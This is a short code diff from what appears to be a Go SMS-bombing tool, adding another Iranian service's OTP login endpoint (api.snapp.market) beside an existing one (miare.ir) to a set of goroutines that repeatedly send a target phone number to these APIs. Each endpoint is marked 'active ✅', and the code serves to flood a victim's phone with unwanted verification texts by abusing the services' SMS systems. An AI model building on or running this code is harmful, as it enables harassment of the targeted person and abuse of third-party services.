@@ -223,7 +223,9 @@ func main() {
 		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)  // active ✅
-
+		go sms(fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
+			"monsmain": "phone",
+		}, ch)  // active ✅
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
 		if statusCode == 404 || statusCode == 400 {
